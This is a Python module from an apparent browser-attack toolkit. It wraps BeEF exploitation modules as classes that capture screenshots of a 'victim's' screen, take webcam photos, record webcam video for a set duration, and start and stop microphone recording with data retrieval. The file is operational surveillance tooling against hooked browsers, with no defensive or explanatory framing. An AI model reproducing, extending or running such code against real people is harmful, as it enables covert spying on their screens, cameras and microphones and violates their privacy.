#!/usr/bin/env python3
"""
Media Capture Attacks
Attacks that capture photos, videos, audio, screenshots
"""
from .base_attack import BaseAttack

class ScreenshotAttack(BaseAttack):
    """Take screenshot of victim's screen"""
    
    def __init__(self, beef_api):
        super().__init__(beef_api)
        self.name = "Screenshot"
        self.description = "Capture screenshot of the browser window"
        self.module_id = 246
        self.category = "media_capture"
        self.execution_time = 4
        
    def get_params(self, **kwargs):
        return {}

class WebcamPhotoAttack(BaseAttack):
    """Take photo from webcam"""
    
    def __init__(self, beef_api):
        super().__init__(beef_api)
        self.name = "Webcam Photo"
        self.description = "Request webcam access and take photo"
        self.module_id = 252
        self.category = "media_capture"
        self.execution_time = 5
        self.requires_user_interaction = True
        self.silent = False
        
    def get_params(self, **kwargs):
        return {}

class WebcamRecordAttack(BaseAttack):
    """Record video from webcam"""
    
    def __init__(self, beef_api):
        super().__init__(beef_api)
        self.name = "Webcam Recording"
        self.description = "Record video from webcam for specified duration"
        self.module_id = 214
        self.category = "media_capture"
        self.execution_time = 15  # Wait longer for recording
        self.requires_user_interaction = True
        self.silent = False
        
    def get_params(self, **kwargs):
        duration = kwargs.get('duration', 10)
        return {'duration': str(duration)}

class RecordAudioStartAttack(BaseAttack):
    """Start audio recording"""
    
    def __init__(self, beef_api):
        super().__init__(beef_api)
        self.name = "Start Audio Recording"
        self.description = "Begin recording audio from microphone"
        self.module_id = 26
        self.category = "media_capture"
        self.execution_time = 2
        self.requires_user_interaction = True
        self.silent = False
        
    def get_params(self, **kwargs):
        return {}

class RecordAudioStopAttack(BaseAttack):
    """Stop audio recording"""
    
    def __init__(self, beef_api):
        super().__init__(beef_api)
        self.name = "Stop Audio Recording"
        self.description = "Stop audio recording and retrieve data"
        self.module_id = 25
        self.category = "media_capture"
        self.execution_time = 3
        
    def get_params(self, **kwargs):
        return {}
